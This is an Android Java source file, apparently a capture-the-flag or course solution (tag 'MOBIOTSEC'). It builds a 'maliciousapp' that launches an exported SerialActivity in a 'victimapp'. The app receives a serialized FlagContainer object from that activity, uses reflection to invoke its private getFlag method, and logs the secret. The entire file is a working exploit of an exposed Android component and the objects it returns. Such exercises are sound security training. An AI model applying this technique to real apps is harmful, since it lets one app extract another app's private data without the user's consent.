package com.example.maliciousapp;

import androidx.activity.result.ActivityResultCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContract;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import com.example.victimapp.FlagContainer;

import java.lang.reflect.Method;

// https://medium.com/@kkunalandroid/serializable-in-android-with-example-38eb8b7334ea

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MOBIOTSEC";
    static final ComponentName SERIAL_ACTIVITY = new ComponentName("com.example.victimapp", "com.example.victimapp.SerialActivity");

    static class SerialContract extends ActivityResultContract<ComponentName, String> {

        @NonNull
        @Override
        public Intent createIntent(@NonNull Context context, ComponentName componentName) {
            Intent intent = new Intent();
            intent.setComponent(componentName);
            return intent;
        }

        @Override
        public String parseResult(int resultCode, @Nullable Intent data) {
            if(resultCode == Activity.RESULT_OK && data != null) {
                Log.i(TAG, "ENTERED " + data.getExtras());
                try {
                    FlagContainer s =  (FlagContainer) data.getExtras().get("flag");
                    Method method = s.getClass().getDeclaredMethod("getFlag");
                    method.setAccessible(true);
                    return (String) method.invoke(s);
                } catch (Exception e){
                    Log.i(TAG, Log.getStackTraceString(e));
                }
                Log.i(TAG, "END");
            }
            return null;
        }
    }

    static class SerialResultCallback implements ActivityResultCallback<String> {

        @Override
        public void onActivityResult(String result) {
            Log.i(TAG, result);
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.SerialActivity"));
        ActivityResultLauncher<ComponentName> getFlag = registerForActivityResult(new SerialContract(), new SerialResultCallback());
        getFlag.launch(SERIAL_ACTIVITY);
    }
}